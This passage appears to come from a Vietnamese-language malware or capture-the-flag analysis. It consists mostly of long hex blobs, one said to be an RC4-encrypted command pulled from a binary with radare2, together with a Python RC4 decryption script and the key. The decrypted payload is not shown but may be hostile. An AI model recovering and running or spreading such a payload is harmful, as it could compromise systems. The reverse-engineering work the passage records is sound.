6e559bd5a7659dd83ebfdde7ccaa88fd02b269c9fe83f4bba047770ba22f6763f9322729e02b1b67b7cb40631096a69a727b5ffe15b0138fd2d46a1402b6661ea89a399a1dc9879098374d08a97d090b10bc36247d4afb9b6b1c6a6f30b17e015e4106c6e07f4b0f048e2357c565381105f4fc16a79b3e998d44b5d38c3dbbe7fef7b28cf4cb1c6dffb31205eeeddc44eb5524940454aff54aa3224c495471eead79ab6a183c2d02eb69586c296f936b5d2ba374bc0b2d46651ec6282a74e782de3d831a79d89aac6262a8adb60ac2bbe9767e4cca51479501edc493f5bad980fe6a368f4a085cd6e6085848e68988c32321db6584700475ea423b3c27a64e8a84c0221ff7e930751239d80c546b214ead908f138e6f2049a967711b3ca8107826af43e50b55838541c84c92c4fb1fde8d5ce1a769de1ceb6fb01adca408e8c5536c5226786be98dd6d02f8a1696516fe784b48bf4a8b206c2cbb75e2bbf68125c94dea99de0c65f105bf21d098eca5ba83293701608cc9297ff055e792c550344ec610ce0f958addda3abfa6572e3dbe2f02b5469be47c43612a6ae5c10856b654a371edd7b078cfc7e908cc484c1abfec9e44fa68335c03604384e874abaddf45f251b29cf929ee80608bfc8cac055adeb45a8b1739c527ebeb966314ad050fffb48c56465be88f43fdef0c4058217d5af2ba93a5481ac0f287edd4cec821f58b59eb13232b4939301a143143f7c01e94461aecd5d75df15bb44fcc7908b351dc2c0a26563df756ef30e15ec127a588ba825f7341625263112515bd6ea96e648afaaaa8734b0ebc6c68a9aa277745dc5f8e9ea39e1d95ddb14a0cad44e0786c6d42cf69107b3e607de70390279428d216669b34b647525cc4909b2da9c93578f106132afbcb46074abc1a92e3cb327887d37e3afb8f9c339091180fca5fe1169250b8f413e7e10de90f55ed010d1f5977af107ef23d800a5d58e09ae051c40ab3a69969a49ce52bdaec3a17479fde179298b96788bc87ef078369ae98ac898881ff18ed5542c2fe41d79eef7e660023b5d9851e9baebb7f16a5f0274030ad661278ed106ae12232e69a352e8cef05f971d556accc5c72dbef8adfdcc4059d86b34004a35159fe7d0723b04625c58f4e2230c8570fb6758bcf9b1612d87f995c1a8157283248c816670a19504c7c11c9f1f5f58e5a4445bd9869a44f29c13ddd173a82cac7da7b038d46463fa6456040f0695f513cfcd9824d42cd0c0f9b3692138c515f332bf98a0977b44442d079825738089163683e07e5263ae006dd7ad53278b23e8d9f784e6492c3a97da1a699723c47dcd8adc55d5b193f46b1a9d190eabaee16231cc64991e74ef370a42912dd918bdb46902563be788c51affd0918d1b3206ebeb4c509381165850ae7516c1214fe219a378e75c1df480d8d2b0be5b7229a1c5d2ca8204b051fe1ec50c087904feb7f3a049434230b5922635656eba89330a3aa8a30e86ef66effa7b288b4380a52d767bcefde3ce231dc4ffa08c627b48674f196ce8cc7fe8e5c00da4e62112c40e714cd68bfd3698c4abd04447f0f5fb5e25b8fc6d5810ca26e066bc5a08a5c4be4a72bb880153b7a26fbe0ecca8507ddbaf229b34114507d3f861b6d5baa4dc409fc9aa12bf7d52b8524183fbb1bcc61885c2c2a8ed029f46cddd733c26b90c73c39dceaef108b3efc8b6fdc580f14866077a408e4fef3074fdae1f4440b8140db41fdaf3169dd04bf32a139ac9d59406cd9247183faee73865c6877a472c3c6b992f27fcf69b80075d9713517f5c7b239c8e8f2f70905630f0787bbf5f0279df5cecb16b5595e7cde7e011e384549b2ccfe4238cfa4c9e579e60db2a3e6799fce90cd7007c133dbda5fdfedb5e24cab0349fcfc0274dcbd62dab0473d984f4a988c9183ab4b11dd4551136051a59285f447997caa84b39201176317e7a36dee67b9bb99593ef7f842e5505df306d52d1a4728990f240e4ad146fb8fb0d3dd9cba7df7c5e237e0f0284f0889a71069693758139dece296e3ebd92280e28c35d52061f7a522876b6b444db904dcb35e14a55fa17fc789e52b6e1d43ecce05896bd6d07e9e114471606db7ca89a35c4962448d396528b0aa16a797d0400977f8d747f43e9ba6fa63c3995129b358147a90ad9b642ada8f22ed2e765a66ad71ab6962cf746aa5751ef3a79f6bf26872fe1b9e3be15b1b9a162e8da5a0242a178189e5e7af9387227e2446b6cd7bb008eb240f02b3b0b8168f6ad4afb8eaa2924e82762d9cb5bb34f3a3ea71020136a5bcfcf04e4b7e7a77bee9a3eb229ca2b2bbceea418490df2c82c29168bd4cf691c6cfe0f15effc523194ac364698b3019729d22f8878f6c9a5c074ef1027e0eb4a784123a4ba10e0c33fd926dcf017ddd07620ff7c02b1644cdcdf8a00c876b2efc2a2e26ee963d647c0fb55044ffa24d2714882246a128159431911e515d782613135181be76a9480158629d22d7c6d5989c448a7db9db83d4e5dc530fcd31da153c07d28d6bd5cb34221b4972e9194af6d13c5087cf27c98d1830d761779a943c5f16bde6aebd78d174fc5c6706bd628ba6f8c179d549a8919ba23136eaa019f8d18f7ffbdfc09c1bc56b686331255f7fe7e1398d0b800e2b3d12f386a1b679c9d6903465105df91efadd061ae4af23c396414bfa9ca780213d4b3e105f7a8ed66ef75435c1d4e42ed7b2892f41574673380f284d6133b7fa54fd2b44caac11dcc5525acbf129b3e7206ff27f685054522c7a3e76614737095cf803ebbb1da1d86715e76fcce9c401a3ab37d330939252d649de3b63d6a20cb49fe778a499682749484ae7dfaf59b6c803a6a0776c262b10eeb15282d9a48d3dd4625b0eb97a7a327132605666a5636a24a2c0659ccd4719fd8dee6b7b598e27fa6f68e5b263f3faf4efee121d23b94a2b8b3f4e06aefab9b296c358a87ccc542a378ffa4e77e25128976aaeff067dd28378208e947e106e2d00a55ade918772a7ef79756e3cd527c88d46089f6084123b690eff4cbb20361cd86be77ef42631cb59edcd6a2e6cf9980e8cd8cedd9466a362bbf5d7a9efccfff1adf98e728e3d6e8d00086e3ecd49e947e9a652c65743ec7efc32623e60b3ea063d7090a363d9648f029a0a444e671440f93b258d1f75e74d4037840f40c6510c9b991ef4a9baedc2f9152e7e4fa399b2608571b5e609c2ed16b76647d9a6744de983fe9a2b2733cd537bd4a8850aa83b99b4326a6b4c83ea86c7ac94aea622fd83aaf38561be8ff9820c79d6df5fa1e35663bf708829e9f02286fd3fe45fc564cf3366bf6ac36caf66e0af766ff270043ec46380c869a6d317269e31828b9875ffc2a316ceddc5bb0a512c58fa7786ff4b34983a3f663a68158a3a284ec0e5d10b38dd1bdfd006ee81ac51c1c342f52454f7edc66f6a493ac7440c91228ab9d6dbbc5b64b3b5fc3cadea62ae59e3e65e14859d3e1cd6012a2f4ee04836a59b3ec1a0aa10fb166f6255aca125507e0c2083b32b77ef499c610c48919a23b4c15717fa133b4326b90e36b6b535039927aedde1f9f9efd69f8c3d099dbc2f43838ad881a5139056a7c41a582246e16be881b0c7b45ec64a958f0738ecea0f780ce7f574b55e4dde7c04be2a8dee9ad8fffe42ee1201439f3f247aa0051bee7c17cff12db938f733f465a121a091918036e8916df157a1e5d3c2ed683818f2e6f51f0a6067e9f13c24bbf22e028d1f5edaf02948d5c62a3674f23ce12a8afd7ed6999717beff47ea2100436f6c30e4344dd813d3b81d846b0bc9ba1a8020af047815e567432b770f7104b5ea0c0891df9a269de3b24cf71693392a3a5d690975104842531b88ae27d9183e74b258c9d2cff352f0d583d41f16e1387c70478ec144a5d51ead17546374d96a3c4f1f8d2a14b87b0252e70cda9956fe6e9a394f903515ca2d1bee7ed7c16f6a00cc0485337dd7daa2d88e02ec1e983333f96d62d8d58a97b8fbed3d852d40c67a959a916f9e2a91fd21e10a13c0883e8e5ec3bbadaa197a09cf1b6f4ff4dcf7b5771ea71ad4bd23a74428104fda5d53c5820f232c98861a2a0d82818f7ac9c131b03108e9d557aaa1d6f0a09aa038839666914a3cd2c1431993d5343f2f37c34f34709b2299fd13d43cdc00ea2d92186101875e1c4075de130e669119b06434b69721dd784b8c10e888f8d40bb32d0b425c1e42a1e5be15be2b7d681666f6bc6b93bb9f9d1e67b7f974768a03e190e7609b16cc3792389c706df8604a4a083e6faf74e0d925643a38bc5f7bd2ca8cfd573f666482307f83f942dd9a0b1899b779bbd46c690147683be64a22a52c0e66f2cbee3ce2571083592d2bcb32ded41968161dfebd28ac707c46a3ec1ab29f33ba829cc61c89e19e51658ed314a776a4fcc22733348f1c9889768737e5daef2deb79a65345df717ddf52f21818ed4f071930386a04b984c9b7841cb7cf7345ae9e704f4102f7c4d51c3fc1b230b6a08c6995a3d7f9f3c2b9f3de75da663d03798f7a164b169e778267553f62202c0f51d5ab56621e77cae3bad6773dab198f4006d4279361841263b1f361b1cd87806424ff7903ee008c15c96ed7b0eaa5cfdd110c15e3a975baf84a76864484267d7e976a1d6d7f697bf4650e881691183e24b5081ba474c30657a20b69cce40e3ef3a28f70b10cefcf65f59e7771fcbffe68e2261de4aae5de1928f55e7319caf5e473261befed7beac2fa51312cadb85f423c6290a3f493a457e2a5a49bb23cf657ae0bbab2a53c54bd0adc468120ffae8f33e43f9f12072b52b919f198ae9058447a526902bc0fba3522d9ba9be6c1fa01b386e25e0117ea2287dca6307f3c97b0629c17f2879c0a7ab24a071620b9dac0177a68a5fe5d291fe2a853a48269738445113ea13084182049a28a08d993d616728fabfec24147ea1004b55099bc10a849e38cb251288db5cec47d2e05bc734c2c1d0b3bf32dab6cf67620788c2d8e9d8a91ede9ccbb75bd59a7ab6b56ae3d455cd0621d9d39ddcd2b915820c819f712920124923240141a7993f1bea1c165837b81b819cd738446fb01aa67a9dab00e7711ddb4c12ca83edc2ec41aea5285519fddbf4cf8ce59b0cb00164ba6684d90133b0ae9b4bafe65f9762944eb81f8156ff9274ca43b1321408be7a90aac979c36e60c12d4f321ace1f97b090f2447133864d8b9b1c8b34839622c5b0dd955fe3efac788fe8a01e7d4188e47876f913d2492065e9c60fb0825c9f629bee03f0ef7ea57d9da1cd68889fa46e914c28db1efe9124d660892f34c276f3f89e7814991e9f3177f7bf94c5bc39fe886a8074013ab2e7baab714789b7b25e0e0fde3f3d71bd45d51635b7071aa17410c6cc7a6e21310fa149fb4c833239e899eaceea8a9110279518f890f8c5ded9a8555a9be5e9208d15389d5799fc9816bcbcf9e562096911877f67dc09bc
```
Sau đó mình viết 1 script python để decrypt payload rc4:
```
def rc4_decrypt(data, key):
    S = list(range(256))
    j = 0
    out = bytearray()
    
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
        
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
        
    return bytes(out)

# Khóa RC4
key_hex = "9f0fe4d8821ad05cc39a80644daeb8b1"
key = bytes.fromhex(key_hex)

# Chuỗi payload trích xuất từ radare2
encrypted_cmd_hex = "a37c59750ed63b04e4cdd2541cf4a26da721dd0d94cc7200301e88f97e9e209ffd2eac477f67f78c7d1fe2e1ab086b44987d6e7a5804d107d9a1efcebafe2b09fb7fa61e8a02b35da36d22faf669fc7233cb1fb1f932da654ade44da3544218135e04794f1b1697e9991fac93ca822871fac18966c99e22c6d20f983182235da4cbcc4740cfca434d7276133d38dc5ee3db6dda404049ff416bbfa65d3351d7d0f2590d53d0a0e49c9a24ee33213d7ae7980ede026acbb5af83b7d2cdeea1c7ac4c1e32bf6bd362abd5163abecf75b164f5a8c12a241374767dbaf86877c27a3690fdc8dc5153f8b2e72f7824164a4ceb6aadb426c44bbd891ceb615ea2b9a28e187c2a80be3c31a9d32a9f06bc95e20b9a4ebb76cc91dbf7923c3dd6c918a3f0f6d1127e44ad0f09cf8473b659caf8eca69245dded507804aecbb211e7006a63e3214bdd28be081ea19f92557b51c9066993cebbc176a96398cddfbca34c2093595c4ce9844926c344bcdbd3e4f4e916869ab08973dc2017ee3f9142b83b33d26c6cf5ade8dc676828e45e863d533b8d724327db826fc48fdf2fa0c44af3cdbd9803c61db4aa59848e2a5f3ca159972ff0bcd1efe6ba2e82b25695e10b242809a975ebca6b900f0309e5ea78f69c0f404d6c3c160c05c3c26bb8114d27dcde486f97a3facb360bb25d49d358ce4bc646c5c9fb37fe1348c2bbaf0a1e920a200b1a832927aa8d708ac70d5d5bb763f969524b11070c651393e7d1e308de983b5bcb2128fceb10c717f60a7f6f2e0edf453a8c63bf919e19ec701399872b1bc65b0a5539e20136f8c3f03bd807b30094382d6bb86293712000ad609123e662c7dfa1edb765b2c479730eba1b6f36a4962042539b45e5a0b0154d22a39079edb281e35b98db2254c709c3d32fbb575ce1bfd19dab6fd7327b7509b9027e11ff3ab79c552a02273642f33d392c7c18eb4a4d38dba54626301222169f8023f74521289ca42f1be64083c2e6c94bcaa11a5e63bb161b49a38088a8dd783c650b250af7e0639962d1bc91ab99dd7bce7f0c3b889a60b2c0071189cf40f603c00d09365a919986c4835dfe39b992c43ea08c90e422432518400ac00343b5fbe134b1c323560b8a028d07a6706f06b7d66635e8a638ead170fdb423fe44975f12cc98362bd65b8fccfca4a7dc8cbf439053ba644812fbb508f0d9952e106232ff7300128f4d67688787709507eb142b6936dc2f6622ee91ee4f4a080131403535282ffa18dc1fce6902e510a3ed4cd80f71d95d18c31e360a3d8a07822974d71452f126f7145d57b4255434bfd600d6f174c7bfcca2e3ea6d75be1c986dabbce201e89a748771d8fd9261619e52093a720b29df580fa4b34904b6b7d31f36f690743b0ba56603ae6105553f0b4f211a063a378b67c52c208ada2326ae07cbdb8a8e65737e63364b8a38a40de0000314b1bd284eb57f583d12e310c90e371c0f031ba7ceb305b240bb492b7fdab00d7962218402f5200fdc0eab978a4aaf55da114a8825626a82cbd33eda02334447885b81213560b87ce76443fafadc2694c275f6adbbf5671b6a1c7a68297a4c8233ebfe18257a652aaaf0a3c5d48c6a2b605164af3af42fa19913383e2a72b3cb84d73c4624e53b8895e5cc6566cdcec548a8466a54e05e21d095891c9c76cccc62aaa36cb3fc1363b79c24136bbe172c0b8a8f28c5d0b32f68a3c762eab93343de28c201d475650c211315708ee7a4ca0fff64b716562c9b70cc74a11f94cf085dd5acf5bc2c1139820cf4f362e5f489e2ec76faa5e79bb2d2f8719fe85b6bd9da2d781538a7d9a165dbe796581f5212f677ed4eb5249bd729962b026f0ba472705351deb00c5ba3a49518abd98ffba5470faf1543d234cc5748877c5a22209c0b8765595fd46fcf5a2419c7fe233c46be3520a05555f9f1884806cb7f3843fe1a860237f0e6bd01dd53bc46582e4be01051bc797566dfa5dd6e8e1ad5d142a29218ba31266f89da9d44fb8526c2f25dc7177f498552136e72dec98c5a4e009f623ada2b1c560a59576f4d3efb523b0963f2c4e9fe6ca7865df60398c674c53782b3a2df5977df0e66e4d97de555847b06b4485d46dd433da39ac0cbce3a266257a7ade541586e76d2a84107e92b1adbe1a1c063908d270efa5ee9e4b5b0e38e2b030aec2c9ba1f69a24b72a66075f714b06ed28f7a48945819f92ae613c696a09f4f15d13b3b62d59e7950d4860ed5c76d34793f065c3d9c758f7155e33e5d9874fdd2df6c79fdf6eb8bb13957cd4bc38c7e0f63e9e95524c07511c89bdd41fc688894ba41b54b7d1e24a5512e727e0f810ccd51a0a34c2b6dbe7812299e22ee172362d418a516a291cc41968a7e02caacd6dcd971afca4ac56e53964acf7e3f90af8101f66e496a8727ec0ff60ddb9035ce8ce3182c338b7ad8538a7d2fb30045eee76c856aaca32294291593a849b7aa0b6f0e832b852e8a2f14ffcbac295b6cae2c6d5b34c05900c43174387025a9c480ead6d89927feee9995a413e1bc77c7dc4d3a1b74380d13ec010c0cf07b408bd848dcbcc3219efe78a77e2c9b524e768de9597b13213d8962d8394da16692c0a696eb3f308a411e966b52a3d2e58df292f0b65d65fabc3eae9d9e63bb9f87a564f390e3a36a0c73899198541919eb742358324f62e4cc39d205306de08c3d25aefc7fab97ac55abd4ed66ee107458329940d6cb68fff88c2f66b82a4855fb95074b512e5664487a43a6c6cfbbbe157d40d021db8cb076f60fa97bdaace63ef09aa396ec4dc9bcc5f428083205f43aa2b34aa635031427dec7df4e6da044302a51e4f2979a97e96d5ae3485397d44947baf363555e48be9ebb979c66424d8e1e5d1bf4bd210b2d164256306b1c3f5019b31586bc64e82b2b128638b4e90d3144216ac25cb956a89d1aa16362ba3b117ad51d0785a9db6e4397e9d3a4f058adec6d98e8db5094cb1c61306851d4ebfe7554b89b101bd9153f2665376805fada196369332067d07797b6fe50ffa6293272006e85b23f8e0ed769abcff3b50d2d075f1c37e60093a5978408753f81d35b99b08117d261bfe74bd806193ee62ea1c1bb285bbe4707e7fbced50b89d1e3214c794b0bea8b6f5e9efe380997930326d52fb4a6a61879c6f7459eae23a19632407eebabb37059315b94d405547a74abf5680f9fefcb07b7ac889edd0d80f620c2c1461a5e4a8622172728c27956f1d80f190e302ced36cd9c7c78bfbfe00c079cafc55e308aa45964656dc94d410473bd5f6d78b95569c75a7ba026ea638acb55ce597afbe5cfcb9665aa1ace89f763b358f9a81b28dd56478a82b4ea15158437c576b6e6e51bc3cead441f133ce663a52a2560fbaab8402cb672a5d0f18e0bf49ae692caa7705c58793142928e80f16591b2706379379d9102f122ef9273a1f84f8ed2bc3a6c78641a4ed71510f044b3de110ecd843c770d27a4736821798f849e5739129678ac38fbf6e37d3ae3a82dbca1093dcd676102c7d718001c2d10f4c0dba127283e9607455118222314cf14ca453615754131dc3a9934d8fd24a61f607b83267d7dec398f81cdc4bca2709d03523f445e115662cd8320582adc985dbf7b1ce668f4664cda676022afc8f817067621449f3bab3cabad01fc50bdedbf94f578e02260f971eb87e06f273326d1c96ede028cccfd4d764df28478862f5b89acec5ba09e9397a6e332ddb55adcec94e65bee6ec6592ae9ce6f40e7cbefcadcac8036e99b6a0e7788773c4a8e3cf09895252136810af6501a2ac7b90fb306df2b988d4fc66deffed37c4b0e1e15aafc925dd7bc5d39adcf48d38e693d7b83e7c7a3e34e6f20511e575f880bfa6d93a19958186fbd2dc7cfeb499461db13c10f0d941ff164e13093306318c77ef275801ce924b77fc15b2343d738afa7f94317e212aa2da0ecb6d7eac5d201c2b2b2f0710371256180f43fc358364a2b17c32b4f1b73e641e3ef75d6818114cf39a8e845718118d5cb27121bab74ebe8ec5b923b0fb0459fc2df0ee12b2a2f186b7646b4684097dc323d7cf4c81ba907a96be0fb2d0f292aac02e23a95ba97a8d60641e26847dc1b876f1fe670e0ef058bf370dfe64fbcee6bb5252d927e4f38ea9e225cc2f793ae5b4dd90aee44badd3b03e26ef705a1dbf38e624ce938db6013fc0782a6ea0206dda123489de58d7ca9c014602b84e799ff3da2228917c3e0073f25ab3e1db84183c41a9d6cb00d2ced245ed9549e0f0fd376268b83e36b7029c4d27948c381cd682da8e5764b9b86ecada4b02e6260411ba1323cc12837bbac1f11695616eabc7b8e6d03d75e47922581bbc6457adaa1c57b76f632159094b098b3eb92dc15a57fb5032e1f87bc8f8746817923159a95a5b60efae0f494c8b668533379e0e6f93cc74f709eb1f841e1b4e26da76816f9a7917207df5f96081bc151f0ce585111ad05dd198cf9223c88e9e34fbf5d1c6af999cf786917e2ec229aa51cd91fa76eafe101bc6dfcbcbb45830fe602516859ce117b3a1ca6a26fdcafcb327c5e6e2e229931c564b0d52d922e5a2e41439b98135695c0cbc93ce78de51dfc2c1bf0c7cef069ee1a5c097f1363113c4feb5dd13233c04ffe1cff55db79c2cc86e809c037c815b6c7c9ede323cb628ab3974a3fc96661a39c17084be19a84b28973ca53bb1f12d5bbd086ca72253924542fe878c1d3b218206d6ef9929f4e5dcc7ddaffe8efc08770a014af4df595a06e5ed36a09bb53f594a3ed980f5ef53bb64899aca88f067c46920a0b08bfb2caed77c5e35adfebbbbbd880e0cb8ea1c8caf84a6465df49abdb841a45e334ea74ba5f6f2482171a43d4907197d59d4c87a99658f8bc34d5393437286a775bc35ac761a1ea869ec0f5adbfd2114cd0ac988662aaaadb671e89c43f73cd3629ad4088a3f8bf4040ad184ba45895ea78206e7a9d74c44d87911fe79a7331cb102c1712cdc188618bf9d7feea48f9464563888d219e4a0b37e3fb56896ce0d9e92673d5c863651279ec175a1ac8f3052256e9249699f330289dc400bb794a89fe5a459957dc6289b0e3893e79132d5a5bddccb6f20a2ae84af437cfa7921d6e46a80db79b5dff90971963b898eaa5dcf37c4bd2df457776768e764bf683ef5f9609c4bac8767a63e9636ee940116346228b188643610236e603d09d764ebd1850975d91b032a0cf00f24ddccdcaa6fb8c036ce6267cd6ad58351479ba7b8cb1c0c71ad5db20c812c9e52b2554d28deb13d87ec7f970804b0b54ed84b15fbc7c86b3507591f1e3e5bcc798190eddb7fa9d69206c1b18e05ee537a69f44cb78621195803fb574f8197c9c675cb83cc5653076878818a7ce07f1d4229e5a4450343f1bf36ec37251e5dc0159aa881001ed3d27323ad12c60916caa5e664085b6e54141f7b1792e290e1526f21b85a66b00a337bff07a0a85e165ceacc6b030b19066fad597ad8f89a021167c78f999ff25448910b8816352ddd54286665eb70d85b5c117f8d80e2961e9af67954243abbda337cebd079aa610e4a80e8f997247bb3ab3b9d0520119cf8c9e7a37c6d6f1475176d8426287d2f4c631416a40232f722a662ab12ce9c663dec0aca6f134a07d20b7a9fc073e6950aa09ece13714bcc97886c5220c5f68117a162e4ced204e491cd7fdbfc3d239c20de91a7fa86ca5b3d63292a9d53fb974065a2a4d7aa023bd28158a109ade55c0f921066533efcdedc14730c4be863384d2266f61d9e1da5f48929c68b141c6a606fa35469c967bba6a745ac26e693e58c6ab7352cf3dc405ead553c63f8359c637b5571c21b445aa10cd354b4e510e3155e902b8d417090db9621645966f44135617da60d37ec29059f19e1bca151cb90333fa5ccbca37d6ab8c7c6f1dbb01e85c050d21dc910a3d58643d202ea18b877de53a3e94de20dcb2feba5898fcea2a07f4b393c864c523c1ede68479c02c7f4fa1cc8ba094d1f18922e3836b2813f14cec4769ae4df2dafcd5f3568482be1f14a049846c142f1f0e8787253195b3b3add10ca025d7d1db77e403c790ebaf670bb933aa5641b0304277d6b33e19425ff6b3340875fda58dd20a3a9809581eabd27b5d01e4ca47c53292b3968c7f4c712b49a60edbb4d4de97bca8cf8eb33d38170c27da647c1ebbb23060a6d4897f9056d24e6f69cdeafeac359687bb3007ecf835d8f2c7f9c9368e4b735f3b38389991406683fdea9bebe03899d1fee2c275ea630933d5c19d80e182c0bc4502379156455ddc6ad5f51e110dd7e64f1154ac0814f8a4779cb1ef862c0a2e3620600b95a2783f9901ede7ac9d8465e237927c4f60c6ecb424657fd43435bc20a0a67b0941815c490e2c856238844419aa649be804fd36cbdfd0e88e8cd02f6ab3c9bf5373a86952f4f1918933071c7c0bdee7eed98abbd20b38f806fd74132d7ddf5177719909224e32f4b91b700d4269d64fdb6a6e1c83e7a76c462edadf359bdced7bc29bb0c69b407031d218984adbbc4492d89fa58f68f3ba6e8293d53bd433ddbffd9bbe10aecb66feaa3dd6df8dff35ad8befbb169e03ff7e1c8b801cbc01561ccae676398bbc2fea9a02d51477c07bd42d82b9646e5ce5eccfcde7e6fc8f8acd2fcbea7c1f31cc807207c9c3536aaed784b99d3cd3245b3506fba11c1f37a59ba9f240a734948f930bb250bc62b18b370151668cc40820d161b726b98513647b9323228b3746494c87fc246d9e4009cdf9ed546b9dc631e5d9b5893ff58027c7a926afdccc71a11e9129feceb2c5fbec7e7c2ecdc6f8941aa15bf66eea018aa0dc2beb852127b829f7b7e93847fcc1610185dee8d561dc36da621986dd9cf7529d1fde81b48c1146d2c538273004119f168e1f85a3732f7a91d7bca4c330b22ac5d73678dc88b913e3f31d98c6f07f1ec91145146337a0779d50e203e8fff9c4d77508644d09fb2ff536db6d5f7a7ba8aba025f3fd36d713355548b61be5627c253f9d87e78c67c58d75b5225995bb5a1920876f1e46dd1d69ff59949037733a15075ef6099ec2ecae8705a8dad3976cbeab7f184254f47f3054d6863fa3a424e01b913a65f842384d2c7a2823016356efe55988e8067f2f51684251f96c3dbdbf5833ec1a4e0e3804b9b22b042b42ac41f8f36d8fa1624d3de578ba4915b3757b2798207dd81e8c6871967442bff594adc8254f48778627a677f8be01470bd57a9754b7687947b59eb57b58b7523f8e79e2d4044027c6cd07c3cc4318f425fbc8a8bf1b3d292cf2e856a87f19ce1e05c76f671704b31a01beb15f66f8be1d6d74bde9e82f65123cae9b53c8a3bcbec531ff6655e70e501f9262264cda2dc5d5424d580b7d9f2ad518fb159b77ccc36b04f7beeda3337e7850b408d618b21e5b15b2a0296b1c02543e92630347730fdc1cdb945995554cbc9e6c27bdc882d4407dc95cef505abc427d6c8ed073c7c47adfdb7d529d5cd6eaf380e9d52740523fc789e85148452fa20d7d6d5f9c8a1c02f55a6794215ad96bc406d244a8e0a076d30c8fbc09d6c8d67fa1b6cb56200f611d14d9d3aec42542faa2b8a0004f0c799f51638ce2ecd584ba52549ef32b8f293c845678aecec1baae1b3511c8ec070bb6d59c6782f9a441f6d5071e19ad0822dbfe463b3354e0f86fc54712be162b0e6cd48fb6ccc78d5ff39ce69e1d0e8a5dcc234b0cdd959611adc19c248b7ae49f511ad6277e636e7636f6a53dea3d79fb4190b29a8f500ac6905d2c30d69b1ac0c5c6b4c2c287dbae8fcd2ff2e0c464d84075f11acaea71ea7e3eefc4f338c243f6da2a7c561a62ee6b0c6ab7bed4329fcb698c13b45547c4ad51451d8e3bdf13f82ec76cb2b6ce27d46b7edec4ae3b0802a0c89f70b784304e66dfd8b6004ff51e33a96dec85da7845d26490722bebae1e956b0503384db88a6e1be9ae1b312321ba75488d969d1d06fe9166f1e9d745fe8513fd77b81930683a2b5d2827cfb525b72e1e60046a6be9fe48eb74832ee2de1de91cbcf96f5327577d16e095911a5943a8f987018d774910b43c636d2b25c07c733a52f104af5a4d4e123e2e4056da9651193359dfb70c4c9bbc44272587a8677d1b817abc3352346ebdda76de5b00480c9decf941fcbf9d3849ef932843d86076da9c00e703d95aa9852b7a0bded52d97c6ad9ea68e6d994dadd5d84632348a8114a94947c770eae78d8bb2772a38c63f74fd61260203eaeb1146bb634ae779478feac9f8d0d94f79c7c52ba86547da79dec0db670e1845776d450615a581eb2fdc3d86dd82c4cc17a9e8fe82b3863798004618c084778756734fc8f7a6726e0595ec193d9951c48e3d943d810c711cfe7a50c3a71340f3ae9c763899faecb4a5216824d075822922b62f91bb6bc727f38cceab324b6fe3af72170981c19d750da64409b17832ccd4daaf0535afd0bf1900b06e1ef0de8e6559b2a4995d45c0109d0e5dbaac5d3caecefca2e20e6c15b8c1ba8dd36cd3164b8a28d5caf07da7c1299af6cdb7c8819ddd1d7d26974d6650d3cb26f14374d13459ef7fbf380b298c4a7b8cd0a3887cc56baa918ef6a0cf1a3f85f8779d5d0bee01335e240a571a13ffb48bdfe733d46369550bc5b9f469faf13eb9ee983628d3c6501395b203f4f7c6c7a85ad8afed4fd0f15e4035e760f5afcab3c99212872e47d506b1b9c255c58a33e01c5a1c56cf8275cec6e0ec794f6155850da1003b9f2da5eb3d9ed0fac4e40c5611eddc24b727529c4e5ba25fab198d534b9f8071fa73003afa3db94e24a8214ea6f6a717815edf05a08b7311964c7ee9fe97cc7648c2b38594156acba0f62ba5e63c2080f75d9454fb7175156bd4ca37e084b3a3b53684ad17e3cdbab58f0d806efcbbef0d3d462161b5e338ced759f46a694c75c9bd41212c3cf04beda158b1e8a83ce7ef17c979f4cb0e7f934dde186339995ae2445555ccd8245cef99360683acdf0e2fcc083964a06073bd7cdf76ed0997b4607c2ac67893af565ca39d5e47f9359901aaa4def0fa7ac9bedbcd52df5bb48f9616c85b287db3f72c8654663630044acb9bc93e5e67f3b5ea4c4b3a2d6dc2921ed39c5840cae9e64e28e2f0ef5eca5cbed87600a663e4e0c06b50d46427d4003e32c4a7df300b722ae390802d2ee650f9fd9ad57a495d05c650fcabfb44d5aa4ef94402b5b13116dbec4146a46051ce2c8df30271649265206226176e290766b9241f152c5fc8d40c498742404e1ab997cd1853c763da3f1a589515e1ca5383bf7bb1fb506def4023158ebecf8cf7a69718d80731a1b8ae4823d5911f455f7904237a7fbaf3d63c8603ad74b8fde64fe25d0fdf85c561e99e7d557288076a095a9fc7b5dfda34ecf32476150d9c0f7d57004259246f386264f681318ffb64619931758acaf3dc98cfe271ae1a810fb504a71dd0c802badcd1b1691cb1e0c7eff2d89505a7d9a3210b6af169b9313fbb0f1635d4a53cae6de781bad23f81924175a3d3d3dd89c9775b871ba10f75318b179f72f6001437a3c289b7d58b7ca1eeb53ae503fce7b52a71e55047551eef7eef25f4a123be73f475151a9e32a1a3b3477fe97d03f70a4ac89fec06e3f6803317558d2a1a1554b6622af8536747ba6b438ad3d59fd1856315ac1758a509498de7a52f6ac871e975efd60593f02d8cb5e20c7187ef2608e371770a971f45079b5dcf03d8ce15d6f9a26faab7a54313bb65acdac9ef19324627d482e8f61e8bca63a89882f814e0a82007335a90bdc60b0c2863427fa683ee51dd7386a9bf5370a049aa9131ad5aee7843e54e2f3ccbdbc75c49c0617235792fdff04f22ea768f62abdc567bb03457b56a11543c0c973fd6dc6626ea9b52f58a8bdcb2aaba59fd9229a3298ab6daced86943d3b66cdf67d0740cf74fb6098c35f19e5284359e01f8fbc139ceb720f461fca05df361bf05d670a5b5928005ed80f55a3508e2693c9aa904e6ff86abf3cc0276550cc23c31b725b9f2d5d1009b1061d4acf798bea5663c3771b509efb7902dc96ebac134a999ffa9cec050b82c96f85d7d5085af7dd8a0891dacb3ad553abe73aae1cc3ea67790b37ace9033a10ec719bc7059c56dd81a0141209fbdd3fc9a79f77d10d204580d151cd4ec922233a64e9a62b36b2e8cc5f258326015318f1e7b3d5edcba78c17570582c86c5d5d01b5414a11998da1270a3f144f0357106ad023dd0d0b48c900d321aa2ca9560fc26e4bd61aca0f5ff9f12b831d952b33b81773fe05c8d83c58d1160c18d84643838d90702946bf7810425d647b63767695b3ff9bc013189a76a504513256cf5058a791c0e1969499ac1050ce3e79f15677a87f3c8f47aec7485e53bcea2fe31c941e68f738333986877a98cf7377f44c1475a3da7bdc9e8fe1645647c565be10e3c36d9f6fd9ceab31ea4ed95835c6dfc061600e4653d0da2409ad08649db2240001dd4aa06a2f7cb1fa5c8b1d77e0631d8c4